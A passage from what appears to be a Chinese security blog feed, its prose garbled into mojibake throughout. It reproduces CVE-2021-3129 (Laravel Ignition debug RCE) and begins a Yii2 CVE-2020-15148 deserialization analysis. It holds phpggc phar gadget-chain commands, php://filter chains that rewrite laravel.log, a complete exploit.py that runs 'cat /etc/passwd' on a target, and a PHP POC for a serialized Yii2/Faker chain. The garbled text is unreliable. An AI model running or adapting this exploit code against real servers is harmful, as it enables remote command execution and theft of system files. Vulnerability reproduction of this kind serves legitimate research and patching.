æ—¶ä¼šè¢«æ¸…ç©ºã€‚phpè¿‡æ»¤å™¨ä¸­åˆšå¥½å­˜åœ¨è¿™äº›è¿‡æ»¤å™¨ï¼Œå³<code>php://filter/read=convert.iconv.utf-16le.utf-8/resource=xxx.txt</code>ï¼Œæ˜¯æŒ‡æŠŠxxx.txtçš„å†…å®¹è§†ä½œ<code>utf16</code>ï¼Œå¹¶å°†å…¶è½¬æ¢æˆ<code>utf8</code>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å…ˆæŠŠPOC base64ç¼–ç ï¼ˆè·å–POCé“¾æ—¶ï¼‰</p><pre><code class="hljs awk">php -d<span class="hljs-string">&#x27;phar.readonly=0&#x27;</span> .<span class="hljs-regexp">/phpggc monolog/</span>rce1 call_user_func phpinfo --phar phar -o php:<span class="hljs-regexp">//</span>output | base64 -w0</code></pre><p>ç„¶åè¿›è¡Œutf-8è½¬utf-16leã€‚åœ¨è¯»logæ–‡ä»¶æ—¶å…ˆè¿›è¡Œutf-16leè½¬utf-8ï¼Œè¿™æ ·ä¹‹å‰çš„å­—ç¬¦éƒ½ä¼šå˜æˆä¹±ç è€ŒPOCä¸ä¼šï¼Œç„¶åä½¿ç”¨base64è§£ç ï¼Œå°±ä¼šå»æ‰ä¹±ç ï¼Œåªå‰©ä¸‹POCæ˜æ–‡ã€‚<strong>ä½†utf-16leç¼–ç ä¼šåœ¨utf-8çš„å­—ç¬¦ååŠ ä¸Šä¸€ä¸ª<code>\00</code>ç©ºå­—èŠ‚</strong>ï¼Œåœ¨utf-8è½¬utf-16leéœ€è¦åœ¨æ¯ä¸ªå­—ç¬¦<strong>åé¢</strong>åŠ ä¸Šä¸€ä¸ª<code>\00</code>å­—èŠ‚ã€‚è¿™é‡Œéœ€è¦ç”¨åˆ°<code>convert.quoted-printable-encode</code>è¿‡æ»¤å™¨ï¼Œå®ƒå¯ä»¥æŠŠæ‰€æœ‰çš„ä¸å¯è§å­—ç¬¦è½¬æ¢æˆ<code>=xx</code>ï¼Œæ¯”å¦‚æŠŠ<code>\00</code>è½¬æ¢æˆ<code>=00</code>ã€‚</p><p>ç†ä¸€ä¸‹æ€è·¯ï¼šPOC==&gt;BASE64==&gt;æŠŠ<code>\00</code>è½¬æ¢æˆ<code>=00</code>==&gt;utf-16le.utf-8</p><p>base64ç¼–ç åœ¨ç”ŸæˆPOCé“¾æ—¶å°±å®Œæˆï¼Œåé¢ä¸¤æ­¥å†™ä¸ªphpæˆ–è€…pyè¿›è¡Œç¼–ç </p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode</code></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$filename = <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-encode|convert.iconv.utf-8.utf-16le/resource=1.txt&quot;</span>; <span class="hljs-comment">//1.txtæ˜¯base64ç¼–ç åçš„POC</span><span class="hljs-keyword">echo</span> $filename;<span class="hljs-meta">?&gt;</span></code></pre><p>PSï¼šBASE64==&gt;æŠŠ<code>\00</code>è½¬æ¢æˆ<code>=00</code>==&gt;utf-16le.utf-8è¿‡ç¨‹ä¹Ÿå¯è„šæœ¬å®ç°</p><pre><code class="hljs coffeescript"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hexpayload = <span class="hljs-string">&quot;xxx&quot;</span> <span class="hljs-comment"># base64 payload</span>armedPayload = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload:    i = <span class="hljs-string">&quot;=&quot;</span>+b2a_hex(i.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).upper()    armedPayload += i+<span class="hljs-string">&quot;=00&quot;</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;123456789012345&quot;</span>+armedPayload)<span class="hljs-comment">#å‰é¢åŠ 15ä¸ªå­—ç¬¦ï¼Œå¯¹åº”å‘ç‚¹1</span></code></pre><p>ç¼–ç ä¹‹åï¼š</p><p><img src="/2021/07/14/rce-0/16.jpg" alt="16"></p><p>è¯»å–æ—¶å†é€†å‘è§£ç ï¼š<code>php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=xxxx/laravel.log</code>å°±å¯è¿˜åŸPOCé“¾ã€‚</p><h5 id="è§¦å‘Pharååºåˆ—åŒ–"><a class="header-anchor" href="#è§¦å‘Pharååºåˆ—åŒ–">ğŸ­</a>è§¦å‘Pharååºåˆ—åŒ–</h5><p><code>phar:///xxxx/laravel/storage/logs/laravel.log</code></p><p><img src="/2021/07/14/rce-0/17.jpg" alt="17"></p><h5 id="æ­¤æ–¹æ³•çš„å‘ç‚¹ï¼š"><a class="header-anchor" href="#æ­¤æ–¹æ³•çš„å‘ç‚¹ï¼š">ğŸ­</a>æ­¤æ–¹æ³•çš„å‘ç‚¹ï¼š</h5><ol><li>å‰é¢æåˆ°<code>laravel.log</code>æ–‡ä»¶ä¸­æœ‰ä¸‰å¤„ä¼šæ˜¾ç¤ºpayloadï¼Œå…¶ä¸­æœ€åä¸€å¤„å½“payloadè¿‡é•¿æ—¶ï¼Œä»ç¬¬åå…­ä¸ªå­—ç¬¦å¼€å§‹éƒ½ä¼šçœç•¥æˆ<code>...</code>ï¼Œå› æ­¤æˆ‘ä»¬è¦ä¿è¯ç¬¬åå…­ä¸ªå­—ç¬¦ä¸åœ¨<code>=</code>çš„åä¸¤ä½ï¼Œæ¯”å¦‚<code>=0.</code>ã€<code>=..</code>ä¼šå¯¼è‡´<code>quoted-printable-decode</code>è¿‡æ»¤å™¨è¿”å›ç©ºç»“æœã€‚å› æ­¤éœ€è¦åœ¨payloadå‰å¡«å……15ä¸ªå­—ç¬¦ï¼Œè®©ç¬¬ä¸‰å¤„ä¸æ˜¾ç¤ºpayloadã€‚</li><li>ç”±äº<code>convert.quoted-printable-decode</code>ä¼šå¯¹<code>=</code>å½“ä½œç‰¹æ®Šå­—ç¬¦ï¼Œå› æ­¤base64ç»“å°¾å¯èƒ½æœ‰çš„<code>=</code>ä¼šé€ æˆè§£æå‡ºé”™ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨æŠŠbase64ç¼–ç åçš„<code>=</code>æ›¿æ¢æˆ<code>=3D</code>ï¼Œå¯¹äºbase64ç¼–ç ä¸­çš„<code>+</code>æœ€å¥½ä¹Ÿæ›¿æ¢æˆ<code>=2B</code>ã€‚</li><li>å‘é€pocä¹‹åï¼Œä½¿ç”¨è¿‡æ»¤å™¨æ¥è§£ælogæ—¶ï¼Œå¦‚æœlaravel.logæœ€ç»ˆçš„å­—èŠ‚æ•°ä¸ºå¥‡æ•°ï¼Œé‚£ä¹ˆåœ¨<code>utf-16le-&gt;utf-8</code>æ—¶åˆä¼šæŠ›å‡ºä¸€æ¡æ–°æ—¥å¿—ï¼Œè¿™æ ·åç»­çš„base64  decodeå°±ä¼šå¤±è´¥äº†ã€‚ç”±äºæˆ‘ä»¬çš„pocä¼šåœ¨logä¸­å‡ºç°ä¸¤æ¬¡ï¼Œå› æ­¤æ‰€æœ‰pocå­—ç¬¦æ•°å¿…ç„¶æ˜¯å¶æ•°ä¸ªï¼Œå½±å“logæ–‡ä»¶å­—ç¬¦æ•°å¥‡å¶çš„åªèƒ½æ˜¯logæ¡†æ¶æ–‡æœ¬æœ¬èº«çš„å­—ç¬¦æ•°ã€‚åªè¦åœ¨æˆ‘ä»¬å‘é€pocä¹‹å‰æå‰å‘é€ä¸€ä¸ªå¶æ•°æ–‡ä»¶åçš„è¯·æ±‚ï¼Œè¿™æ ·æœ€ç»ˆçš„logä¸­å°±ä¼šæœ‰ä¸¤æ¬¡logæ¡†æ¶æœ¬èº«çš„å­—ç¬¦ï¼Œå› æ­¤å¿…ä¸ºå¶æ•°ã€‚</li></ol><h4 id="æ–¹å¼äºŒ"><a class="header-anchor" href="#æ–¹å¼äºŒ">ğŸ­</a>æ–¹å¼äºŒ</h4><p>ç›´æ¥åœ¨ä¸‹è½½çš„CVEä¸­ä¿®æ”¹exploit.pyä¸­çš„urlä¸ºè‡ªå·±çš„æ¼æ´åœ°å€ï¼ŒæŠŠexpå’Œphpggcæ”¾åœ¨åŒä¸€ç›®å½•ï¼Œä½¿ç”¨python3æ‰§è¡Œexp</p><p><img src="/2021/07/14/rce-0/13.jpg" alt="13"></p><p>PSï¼š</p><blockquote><p>phpggcåœ¨githubä¸Šæœ‰<br><code>git clone https://github.com/ambionics/phpggc.git</code>(éœ€è¦ç»™phpggcæ‰§è¡Œæƒé™)<br>docker-composeç”¨å®Œè®°å¾—å…³<br><img src="/2021/07/14/rce-0/14.jpg" alt="14"></p></blockquote><blockquote><p><a href="http://exploit.py">exploit.py</a></p><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span>import requests as reqimport os, uuid<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span>:</span>    __gadget_chains = &#123;        <span class="hljs-string">&quot;monolog_rce1&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce1 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,        <span class="hljs-string">&quot;monolog_rce2&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce2 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,        <span class="hljs-string">&quot;monolog_rce3&quot;</span>: r<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; php -d &#x27;phar.readonly=0&#x27; phpggc/phpggc monolog/rce3 system %s --phar phar -o php://output | base64 -w0 | python -c &quot;</span>import sys;print(<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;=&#x27;</span> + hex(ord(i))[<span class="hljs-number">2</span><span class="hljs-symbol">:</span>].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;=00&#x27;</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sys.stdin.read()]).upper())<span class="hljs-string">&quot; &gt; payload.txt&quot;</span><span class="hljs-string">&quot;&quot;</span>,    &#125;  <span class="hljs-comment"># phpggcé“¾é›†åˆï¼Œæš‚æ—¶æ·»åŠ rce1åç»­å†æ·»åŠ å…¶ä»–å¢å¼ºé€šæ€èƒ½åŠ›</span>    __delimiter_len = <span class="hljs-number">8</span>  <span class="hljs-comment"># å®šç•Œç¬¦é•¿åº¦</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__vul_check</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        resp = req.get(<span class="hljs-keyword">self</span>.__url, verify=False)        <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">405</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;laravel&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.<span class="hljs-symbol">text:</span>            <span class="hljs-keyword">return</span> False        <span class="hljs-keyword">return</span> True    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__payload_send</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, payload)</span></span><span class="hljs-symbol">:</span>        header = &#123;            <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>        &#125;        data = &#123;            <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,            <span class="hljs-string">&quot;parameters&quot;</span>: &#123;                <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;cve20213129&quot;</span>,                <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span>            &#125;        &#125;        data[<span class="hljs-string">&quot;parameters&quot;</span>][<span class="hljs-string">&quot;viewFile&quot;</span>] = payload        resp = req.post(<span class="hljs-keyword">self</span>.__url, headers=header, json=data, verify=False)        <span class="hljs-comment"># print(resp.text)</span>        <span class="hljs-keyword">return</span> resp    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__command_handler</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, command)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><span class="hljs-string">        å› ä¸ºç”¨æˆ·å‘½ä»¤è¦æ³¨å…¥åˆ°payloadç”Ÿæˆçš„å‘½ä»¤ä¸­ï¼Œä¸ºäº†é˜²æ­¢å½±å“ç»“æ„ï¼Œæ‰€ä»¥è¿›è¡Œä¸€äº›å¤„ç†ã€‚</span><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot;&quot;</span>        <span class="hljs-keyword">self</span>.__delimiter = str(uuid.uuid1())[<span class="hljs-symbol">:self</span>.__delimiter_len]  <span class="hljs-comment"># å®šç•Œç¬¦ç”¨äºå®šä½é¡µé¢ä¸­å‘½ä»¤æ‰§è¡Œç»“æœçš„ä½ç½®ã€‚</span>        <span class="hljs-comment"># print(delimiter)</span>        command = <span class="hljs-string">&quot;echo %s &amp;&amp; %s &amp;&amp; echo %s&quot;</span> % (<span class="hljs-keyword">self</span>.__delimiter, command, <span class="hljs-keyword">self</span>.__delimiter)        <span class="hljs-comment"># print(command)</span>        escaped_chars = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;|&#x27;</span>]  <span class="hljs-comment"># æˆ‘åªæƒ³åˆ°è¿™ä¹ˆå¤šï¼Œå¯è‡ªè¡Œæ·»åŠ ã€‚</span>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-symbol">escaped_chars:</span>            command = command.replace(c, <span class="hljs-string">&#x27;\\&#x27;</span> + c)        <span class="hljs-comment"># print(command)</span>        <span class="hljs-keyword">return</span> command    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__clear_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(            <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__gen_payload</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, gadget_chain)</span></span><span class="hljs-symbol">:</span>        gen_shell = <span class="hljs-keyword">self</span>.__gadget_chains[gadget_chain] % (<span class="hljs-keyword">self</span>.__command)        <span class="hljs-comment"># print(gen_shell)</span>        os.system(gen_shell)        with open(<span class="hljs-string">&#x27;payload.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as <span class="hljs-symbol">f:</span>            payload = f.read().replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) + <span class="hljs-string">&#x27;a&#x27;</span>  <span class="hljs-comment"># æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä½¿å¾—ä¸¤ä¸ªå®Œæ•´çš„payloadæ€»æ˜¯åªæœ‰ä¸€ä¸ªå¯ä»¥æ­£å¸¸è§£ç </span>        os.system(<span class="hljs-string">&quot;rm payload.txt&quot;</span>)        <span class="hljs-comment"># print(payload)</span>        <span class="hljs-keyword">return</span> payload    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decode_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(            <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__unserialize_log</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span>)    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__rce</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        text = <span class="hljs-keyword">self</span>.__unserialize_log().text        <span class="hljs-comment"># print(text)</span>        echo_find = text.find(<span class="hljs-keyword">self</span>.__delimiter)        <span class="hljs-comment"># print(echo_find)</span>        <span class="hljs-keyword">if</span> echo_find &gt;= <span class="hljs-number">0</span><span class="hljs-symbol">:</span>            <span class="hljs-keyword">return</span> text[echo_find + <span class="hljs-keyword">self</span>.__delimiter_len + <span class="hljs-number">1</span>: text.find(<span class="hljs-keyword">self</span>.__delimiter, echo_find + <span class="hljs-number">1</span>)]        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;[-] RCE echo is not found.&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">(<span class="hljs-keyword">self</span>)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">for</span> gadget_chain <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.__gadget_chains.keys()<span class="hljs-symbol">:</span>            print(<span class="hljs-string">&quot;[*] Try to use %s for exploitation.&quot;</span> % (gadget_chain))            <span class="hljs-keyword">self</span>.__clear_log()            <span class="hljs-keyword">self</span>.__clear_log()            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">2</span>)            <span class="hljs-keyword">self</span>.__payload_send(<span class="hljs-keyword">self</span>.__gen_payload(gadget_chain))            <span class="hljs-keyword">self</span>.__decode_log()            print(<span class="hljs-string">&quot;[*] Result:&quot;</span>)            print(<span class="hljs-keyword">self</span>.__rce())    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, target, command)</span></span><span class="hljs-symbol">:</span>        <span class="hljs-keyword">self</span>.target = target        <span class="hljs-keyword">self</span>.__url = req.compat.urljoin(target, <span class="hljs-string">&quot;_ignition/execute-solution&quot;</span>)        <span class="hljs-keyword">self</span>.__command = <span class="hljs-keyword">self</span>.__command_handler(command)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">self</span>.__vul_check()<span class="hljs-symbol">:</span>            print(<span class="hljs-string">&quot;[-] [%s] is seems not vulnerable.&quot;</span> % (<span class="hljs-keyword">self</span>.target))            print(<span class="hljs-string">&quot;[*] You can also call obj.exp() to force an attack.&quot;</span>)        <span class="hljs-symbol">else:</span>            <span class="hljs-keyword">self</span>.exp()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><span class="hljs-symbol">:</span>    Exp(<span class="hljs-string">&quot;http://xxx:8888&quot;</span>, <span class="hljs-string">&quot;cat /etc/passwd&quot;</span>)<span class="hljs-keyword">if</span> __name_<span class="hljs-number">_</span> == <span class="hljs-string">&#x27;__main__&#x27;</span><span class="hljs-symbol">:</span>    main()</code></pre></blockquote><h2 id="åè®°"><a class="header-anchor" href="#åè®°">ğŸ­</a>åè®°</h2><p>CVE-2021-3129åˆ†æå¤ç°å¤ªéš¾äº†ï¼Œå‘ç‚¹è´¼å¤šï¼Œè€Œä¸”è¿™ä¸ªæ¼æ´åŸä½œè€…éƒ½æ²¡å£°æ˜ï¼Œè¦ç–¯ç‹‚æ‰¾æ–‡ç« ï¼›ä¸çŸ¥é“æ˜¯ä¸æ˜¯å¥½ä¹…æ²¡å¼€kaliï¼ˆä¸€ä¸ªå­¦æœŸâ€¦â€¦ğŸ’¢ğŸ’¢ğŸ’¢ï¼‰ï¼ŒæŒ‡ä»¤æœ‰ç‚¹ä¸ç†Ÿæ‚‰ï¼Œè€Œä¸”pipï¼Œdocker-composeç¯å¢ƒå…¨ä¹±äº†ï¼Œæ­ç¯å¢ƒå°±æ­äº†å¥½ä¹…ï¼Œæ‰§è¡Œ<code>docker-compose up -d</code>çš„æ—¶å€™ä¸€å®šè¦åˆ‡åˆ°rootæƒé™ï¼Œå¦åˆ™ä¼šç–¯ç‹‚æŠ¥é”™ğŸ’«ğŸ’«ğŸ’«ï¼Œå¤ç°è¿™ä¸ªè¿˜å¾—äº†è§£åŠ¨æ€è°ƒè¯•ï¼Œphpstormåˆä¸æ“…é•¿ï¼Œåˆè·‘å»å­¦â€¦â€¦æ€»ä¹‹å¼‚å¸¸è‰°è¾›ğŸ‘»ğŸ‘»ğŸ‘»ã€‚</p><h4 id="å‚è€ƒï¼š"><a class="header-anchor" href="#å‚è€ƒï¼š">ğŸ­</a>å‚è€ƒï¼š</h4><p><a href="https://xz.aliyun.com/t/9165?page=1#toc-3">Laravel Debug RCEåˆ†æ</a></p><p><a href="https://anquan.baidu.com/article/1286">Laravel Debugæ¨¡å¼ä¸‹è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ</a></p><p><a href="https://www.ambionics.io/blog/laravel-debug-rce">Laravel &lt;= v8.4.2 debug mode: Remote code execution (CVE-2021-3129)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Yii2 ååºåˆ—åŒ–ï¼ˆCVE-2020-15148ï¼‰åˆ†æ</title>
    <link href="/2021/07/12/filter/"/>
    <url>/2021/07/12/filter/</url>
    
    <content type="html"><![CDATA[<p>Yiiæ˜¯ä¸€å¥—åŸºäºç»„ä»¶ã€ç”¨äºå¼€å‘å¤§å‹ Web åº”ç”¨çš„é«˜æ€§èƒ½ PHP æ¡†æ¶ï¼ŒYii2 2.0.38 ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œç¨‹åºåœ¨è°ƒç”¨unserialize()æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡æ„é€ ç‰¹å®šçš„æ¶æ„è¯·æ±‚æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>å…¶åº”ç”¨ç»“æ„å¦‚ä¸‹ï¼š</p><img src="/2021/07/12/filter/1.jpg" alt="1" style="zoom: 50%;"><p>ç ”ç©¶å‰å…ˆæ­ä¸ªæ¡†æ¶ï¼Œå¯ä»¥composerå®‰è£…ï¼Œä¸è¿‡ç‰¹åˆ«æ…¢ã€‚æˆ‘æ˜¯ç›´æ¥åˆ°githubä¸Šä¸‹è½½çš„ï¼Œéœ€è¦ä¿®æ”¹<code>config/web.php</code>æ–‡ä»¶é‡Œ<code>cookieValidationKey</code>çš„å€¼ï¼Œä»»æ„å€¼å³å¯</p><p>æ­å®Œå¦‚ä¸‹é¡µé¢</p><p><img src="/2021/07/12/filter/4.jpg" alt="4"></p><h2 id="æ¼æ´åˆ†æ"><a class="header-anchor" href="#æ¼æ´åˆ†æ">ğŸ­</a>æ¼æ´åˆ†æ</h2><p>å…ˆçœ‹githubçš„commitè®°å½•</p><p><img src="/2021/07/12/filter/5.jpg" alt="5"></p><p>ä»BatchQueryResults.phpå‡ºå‘å¼€å§‹æŒ–é“¾ã€‚</p><h3 id="POC1"><a class="header-anchor" href="#POC1">ğŸ­</a>POC1</h3><p>èµ·å§‹ç‚¹ä¸€èˆ¬éƒ½æ˜¯èƒ½å¤Ÿè‡ªåŠ¨è°ƒç”¨çš„å‡½æ•°ä¸­ï¼Œä¹Ÿå°±æ˜¯__destruct()æ–¹æ³•ï¼š</p><p><img src="/2021/07/12/filter/2.jpg" alt="2"></p><p>è°ƒç”¨reset()æ–¹æ³•</p><p><img src="/2021/07/12/filter/3.jpg" alt="3"></p><p><code>$this-&gt;dataReader</code>å¯æ§ï¼Œå¯ä»¥è°ƒç”¨ä¸å­˜åœ¨close()æ–¹æ³•å¹¶ä¸”å­˜åœ¨__call()æ–¹æ³•çš„ç±»ï¼Œå°±æ˜¯æ‰¾ä¸€ä¸ªè·³æ¿ã€‚å…¨å±€æœç´¢<code>__call</code>,å‡ºç°äº†å¾ˆå¤šç»“æœï¼Œä½†æ˜¯æœ€å¥½åˆ©ç”¨çš„ä¸€ä¸ªæ˜¯<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>,å®ƒçš„<code>__call</code>æ–¹æ³•ï¼š</p><p><img src="/2021/07/12/filter/6.jpg" alt="6"></p><p>è·Ÿè¿›format</p><p><img src="/2021/07/12/filter/7.jpg" alt="7"></p><p><code>$formatter</code>ä¸<code>$arguments</code>éƒ½ä¸å¯æ§ï¼Œå†è·Ÿè¿›getFormatter</p><p><img src="/2021/07/12/filter/8.jpg" alt="8"></p><p><code>$formatter</code>ä¼ å…¥äº†<code>$this-&gt;getFormatter</code>,åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œ<code>$this-&gt;formatters</code>å¯æ§ï¼Œåˆ™<code>getFormatter</code>æ–¹æ³•çš„è¿”å›å€¼æ˜¯å¯æ§çš„ã€‚ä¹Ÿå°±æ˜¯è¯´call_user_func_arrayè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºç©ºï¼Œè¿™é‡Œå¯ä»¥æ‰§è¡Œ<code>phpinfo</code>ï¼š</p><pre><code class="hljs php-template"><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;</span><span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;</span><span class="php">  <span class="hljs-keyword">private</span> $_dataReader;</span><span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$_dataReader</span>) </span>&#123;</span><span class="php">   <span class="hljs-keyword">$this</span>-&gt;_dataReader = $_dataReader;</span><span class="php">  &#125;</span><span class="php"> &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;</span><span class="php"> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;</span><span class="php">  <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();</span><span class="php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$formatters</span>) </span>&#123;</span><span class="php">   <span class="hljs-keyword">$this</span>-&gt;formatters = $formatters;</span><span class="php">  &#125;</span><span class="php"> &#125;</span><span class="php">&#125;</span><span class="php"><span class="hljs-keyword">namespace</span> &#123;</span><span class="php"> $a = <span class="hljs-keyword">new</span> Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;close&#x27;</span>=&gt;<span class="hljs-string">&#x27;phpinfo&#x27;</span>));</span><span class="php"> $b = <span class="hljs-keyword">new</span> yii\db\BatchQueryResult($a);</span><span class="php"> <span class="hljs-keyword">print</span>(urlencode(serialize($b)));</span><span class="php">&#125;</span></code></pre><p>æ¥ä¸‹æ¥è¦å¯»æ‰¾å˜é‡å¯æ§çš„rceç‚¹â€”â€”&gt;æ‰¾è°ƒç”¨äº†call_user_funcå‡½æ•°çš„æ— å‚æ–¹æ³•,æ„é€ æ­£åˆ™ï¼š<code>function \w+\(\) ?\n?\&#123;(.*\n)+call_user_func</code>æˆ–<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>è¿›è¡Œæœç´¢æ‰¾åˆ°ä¸¤ä¸ªå®¹æ˜“åˆ©ç”¨çš„</p><ul><li><code>rest/CreateAction.php</code></li><li><code>rest/IndexAction.php</code></li></ul><h5 id="IndexAction-php"><a class="header-anchor" href="#IndexAction-php">ğŸ­</a>IndexAction.php</h5><p><img src="/2021/07/12/filter/9.jpg" alt="9"></p><p><code>$this-&gt;checkAccess</code>ä»¥åŠ<code>$this-&gt;id</code>éƒ½å¯æ§</p><p>æ€è·¯ï¼š<code>__destruct</code>-&gt;<code>reset()</code>-&gt;<code>__call</code>-&gt;<code>call_user_func_array()</code>-&gt;<code>call_user_func</code>-&gt; 